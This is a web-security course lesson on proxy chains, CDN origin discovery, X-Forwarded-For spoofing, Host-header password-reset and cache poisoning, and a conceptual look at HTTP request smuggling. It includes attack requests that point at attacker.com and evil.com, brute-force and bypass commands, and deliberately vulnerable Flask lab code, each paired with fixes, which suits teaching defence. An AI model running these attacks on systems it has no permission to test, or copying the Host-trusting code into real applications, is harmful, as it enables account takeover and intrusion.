---
title: "Load Balancers, Proxies, and Host Header Attacks"
tags: [foundation, web, load-balancer, reverse-proxy, host-header,
       CDN-bypass, X-Forwarded-For, HTTP-request-smuggling, attacker-mindset]
module: 01-Foundation-03
day: 26
related_topics:
  - Web Architecture Full Stack (Day 017)
  - HTTP Headers and Security Headers (Day 018)
  - CSP and Web Cache Behaviour (Day 025)
  - Password Reset Flaws (Day 046)
---

# Day 026 — Load Balancers, Proxies, and Host Header Attacks

## Goals

By the end of this lesson you will be able to:

1. Explain how a CDN, load balancer, and reverse proxy fit in the request
   path and what each one sees.
2. Describe three attacks that exploit trust in forwarding headers.
3. Exploit a host header injection to poison a password reset link.
4. Explain HTTP request smuggling at a conceptual level.
5. Identify whether a target is behind a CDN and attempt to discover
   the real origin IP.

---

## Prerequisites

- [Day 017 — Web Architecture Full Stack](DAY-0017-Web-Architecture-Full-Stack.md)
- [Day 025 — CSP and Web Cache Behaviour](DAY-0025-CSP-and-Web-Cache-Behaviour.md)

---

## Main Content — Part 1: The Proxy Chain

### 1. Anatomy of a Production Request Chain

```
User → CDN (Cloudflare/Fastly) → WAF → Load Balancer
                                              ↓
                                   App Server Pool (nginx)
                                              ↓
                                   Application (Flask/Express/Rails)
                                              ↓
                                        Database
```

Each hop adds headers before passing the request along:

```
X-Forwarded-For: user-IP, cdn-IP, waf-IP
X-Real-IP: user-IP
X-Forwarded-Host: original-Host-header
X-Forwarded-Proto: https
Via: 1.1 cloudflare
CF-Connecting-IP: user-IP   (Cloudflare-specific)
```

**The security problem:** The application server often trusts these headers
to determine the real client IP. If the application is reachable directly
(bypassing the CDN/WAF), an attacker can forge these headers.

---

### 2. CDN Bypass — Direct-to-Origin Access

If an attacker knows the origin IP, they can send requests directly —
bypassing the WAF, rate limiter, and DDoS protection.

**Techniques to find origin IP:**

```bash
# 1. Historical DNS records (before CDN was added)
# SecurityTrails, Shodan, Censys often have old A records

# 2. Certificate Transparency logs (the cert may include the real IP or
#    a direct subdomain)
curl "https://crt.sh/?q=%.target.com&output=json" | \
    python3 -c "import sys,json; [print(c['name_value'])
    for c in json.load(sys.stdin)]" | sort -u

# 3. Mail server records (MX records often point to hosting infrastructure
#    on the same IP block)
dig MX target.com
# If mail server is in the same IP range → try that range for the web app

# 4. Shodan / Censys fingerprint
# Search for the SSL cert subject on non-standard IPs
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str

# 5. Try known CDN bypass tricks
# Some apps include their real IP in error pages or debug headers
curl -H "X-Originating-IP: 127.0.0.1" https://target.com/

# 6. If you find the origin IP, verify with Host header:
curl https://1.2.3.4/ -H "Host: target.com" -k
```

---

### 3. IP-Based Access Control Bypass (X-Forwarded-For)

Many applications restrict admin panels or API endpoints to internal IPs.
If the app trusts `X-Forwarded-For` to determine client IP:

```bash
# Normal request — blocked:
curl https://target.com/admin
# 403 Forbidden

# Spoof source IP:
curl https://target.com/admin \
     -H "X-Forwarded-For: 127.0.0.1"
# 200 OK — if the app trusts this header

# Try various internal ranges:
for ip in 127.0.0.1 10.0.0.1 192.168.1.1 172.16.0.1 localhost; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/admin" -H "X-Forwarded-For: $ip")
    echo "$ip → $code"
done
```

---

## Main Content — Part 2: Host Header Attacks

### 4. How the Host Header Is Used

The `Host` header tells the server which virtual host is being requested.
Applications often use it to:

1. Build absolute URLs in responses (redirects, links).
2. Build password reset URLs (the email contains a link using `Host`).
3. Route to different backend services.
4. Generate CSRF tokens or API URLs.

If the application trusts `Host` without validation, the attacker can
inject an arbitrary hostname.

---

### 5. Password Reset Poisoning via Host Header

**Vulnerable code (Python/Django-style):**

```python
def password_reset(request):
    email = request.POST['email']
    token = generate_secure_token()
    reset_url = f"https://{request.META['HTTP_HOST']}/reset?token={token}"
    send_email(email, f"Reset your password: {reset_url}")
```

`HTTP_HOST` is the `Host` header from the request — controlled by the
attacker if they are the one making the reset request.

**Attack:**

```
POST /forgot-password HTTP/1.1
Host: attacker.com          ← Injected host
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

The server sends the victim an email with a reset link pointing to
`attacker.com`. The victim clicks it → the token is sent to `attacker.com`
→ attacker uses the token at `target.com/reset?token=STOLEN_TOKEN` →
account takeover.

**Detection:**

```bash
curl -X POST https://target.com/forgot-password \
     -H "Host: burpcollaborator.net" \
     -d "email=YOUR_OWN_TEST_EMAIL"
# Check if the reset email contains burpcollaborator.net in the link
```

In Burp Suite Pro, use Burp Collaborator as the injected host to detect
the interaction even when you're not watching your test email.

---

### 6. Host Header Attacks Beyond Password Reset

**Attack 2 — Web Cache Poisoning via Host:**

```
GET / HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com
```

If the CDN keys the cache on `Host: target.com` but the app uses
`X-Forwarded-Host` to build resource URLs in the response:

```html
<script src="//evil.com/app.js"></script>
```

This poisoned response gets cached and served to all visitors.

**Attack 3 — SSO Redirect URI Construction:**

```
POST /oauth/authorize HTTP/1.1
Host: evil.com

# Server builds redirect_uri using Host:
# redirect_uri=https://evil.com/callback?code=AUTH_CODE
# The auth code is sent to attacker's domain
```

**Attack 4 — Virtual Host Enumeration (brute force):**

```bash
# Does the server host other applications accessible via Host header?
ffuf -u https://TARGET_IP/ \
     -H "Host: FUZZ.internal.corp" \
     -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
     -mc 200,301,302 -fs NORMAL_RESPONSE_SIZE
```

---

## Main Content — Part 3: HTTP Request Smuggling (Conceptual)

### 7. HTTP Request Smuggling

**The problem:** When two systems (e.g., CDN + app server) disagree on
where one HTTP request ends and the next begins.

HTTP/1.1 allows two ways to specify request body length:
- `Content-Length: 42` (exact byte count)
- `Transfer-Encoding: chunked` (body divided into chunks)

The RFC says `Transfer-Encoding` takes priority. Not all servers agree.

**CL.TE Smuggling (CDN uses Content-Length; App uses Transfer-Encoding):**

```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The CDN sees `Content-Length: 13` → forwards the entire body.
The app server sees `Transfer-Encoding: chunked` → the `0\r\n\r\n` ends
the chunked body. "SMUGGLED" is left in the TCP buffer → interpreted as
the start of the next request from a different user.

**Impact:** Poison another user's request (steal credentials, bypass
front-end access controls, perform XSS via reflected smuggled data).

This topic goes very deep. For now: know the concept, know it's a
real class of vulnerability, and know it lives at the CDN↔App boundary.
Full exploitation is covered in advanced web modules.

---

## Key Takeaways

1. **CDN/WAF bypass via direct-to-origin invalidates perimeter security.**
   Security controls must exist on the application itself — not only on the
   CDN layer. Find the real origin IP before testing.
2. **Password reset poisoning is a high-severity Host header attack.** If
   the app uses `Host` to build email links, injecting an attacker domain
   gives you password reset tokens for any account.
3. **`X-Forwarded-For` trust without validation is a security control
   bypass.** Only trust these headers if the request came from a known,
   trusted proxy IP.
4. **HTTP request smuggling lives at proxy boundaries.** It's subtle, hard
   to test manually, and has severe impact (cache poisoning, cross-user data
   exposure, WAF bypass). In production, use HTTP/2 end-to-end to eliminate
   the CL/TE ambiguity.
5. **The Host header is used in more places than most developers realise.**
   Password resets, OAuth redirect URIs, CORS validation, API URL generation,
   and cache keys all potentially use it.

---

## Exercises

### Exercise 1 — Host Header Password Reset Poisoning

Set up a vulnerable Flask app:

```python
from flask import Flask, request
import smtplib

app = Flask(__name__)

@app.route('/forgot', methods=['POST'])
def forgot():
    email = request.form['email']
    # VULNERABLE: trusts Host header to build reset URL
    host = request.headers.get('Host')
    reset_url = f"https://{host}/reset?token=fake_token_123"
    print(f"Email would be sent to {email}: {reset_url}")
    return "Reset email sent"
```

1. Send a password reset request normally.
2. Send with `Host: attacker.com`.
3. Confirm the reset URL in the log contains `attacker.com`.
4. Fix: hardcode the domain in the application configuration.

### Exercise 2 — CDN Origin Discovery

For a target you own (or a lab environment behind a CDN):

1. Use `crt.sh` to find all subdomains.
2. Use `dig MX` to find the mail server IP range.
3. Use `shodan search "ssl.cert.subject.cn:target.com"` (requires free
   account) to find IPs serving the SSL cert.
4. For any candidate IPs, try: `curl https://IP/ -H "Host: target.com" -k`

### Exercise 3 — X-Forwarded-For Bypass Lab

Write a Flask route that restricts access to `127.0.0.1`:

```python
@app.route('/admin')
def admin():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip != '127.0.0.1':
        return 'Forbidden', 403
    return 'Admin Panel'
```

Test: curl without header (403), then with
`-H "X-Forwarded-For: 127.0.0.1"` (200). Fix by using
`request.remote_addr` only.

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 025 — CSP and Web Cache Behaviour](DAY-0025-CSP-and-Web-Cache-Behaviour.md)*
*Next: [Day 027 — Web Architecture Hardening and Review](DAY-0027-Web-Architecture-Hardening-and-Review.md)*
